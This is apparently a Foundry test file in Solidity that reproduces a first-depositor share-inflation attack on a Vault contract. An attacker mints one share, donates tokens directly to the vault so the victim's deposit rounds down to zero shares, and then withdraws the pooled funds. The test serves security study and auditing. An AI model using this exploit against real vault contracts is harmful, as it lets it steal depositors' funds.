// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {UnderlyingToken} from "../src/UnderlyingToken.sol";
import {ShareToken} from "../src/ShareToken.sol";
import {Vault} from "../src/Vault.sol";

contract VaultAttackTest is Test {
    Vault public vault;
    UnderlyingToken public underlyingToken;
    ShareToken public shareToken;

    address owner = address(0xabc);
    address attacker = address(0x123);
    address victim = address(0x456);

    function setUp() public {
        vm.startPrank(owner);
        underlyingToken = new UnderlyingToken();
        shareToken = new ShareToken();
        vault = new Vault(address(underlyingToken), address(shareToken));
        shareToken.setVaultAddress(address(vault));

        // Initial assets
        underlyingToken.transfer(attacker, 100000 * 1e18);
        underlyingToken.transfer(victim, 100000 * 1e18);
        vm.stopPrank();
    }

    function testAttack() public {
        // Attacker deposit 1
        vm.startPrank(attacker);
        underlyingToken.approve(address(vault), 100000 * 1e18);
        vault.deposit(1e18);
        assertEq(underlyingToken.balanceOf(address(vault)), 1e18);
        assertEq(vault.totalShares(), 1);

        // Attacker deposit 20000 since the victim wants to do so
        underlyingToken.transfer(address(vault), 20000 * 1e18);
        assertEq(underlyingToken.balanceOf(address(vault)), (20000 + 1) * 1e18);
        assertEq(vault.totalShares(), 1);
        assertEq(vault.sharePrice(), (20000 + 1) * 1e18);
        vm.stopPrank();

        // Victim deposits 20000
        vm.startPrank(victim);
        underlyingToken.approve(address(vault), 20000 * 1e18);
        vault.deposit(20000 * 1e18);
        assertEq(vault.totalShares(), 1);
        assertEq(vault.sharePrice(), (20000 + 1 + 20000) * 1e18);
        assertEq(shareToken.balanceOf(victim), 0);
        assertEq(shareToken.balanceOf(attacker), 1);
        assertEq(underlyingToken.balanceOf(address(vault)), (20000 + 1 + 20000) * 1e18);
        vm.stopPrank();

        // Attacker withdraws 1
        vm.startPrank(attacker);
        vault.withdraw(1);
        assertEq(underlyingToken.balanceOf(address(vault)), 0);
        assertEq(underlyingToken.balanceOf(address(attacker)), (100000 + 20000) * 1e18);
    }
}
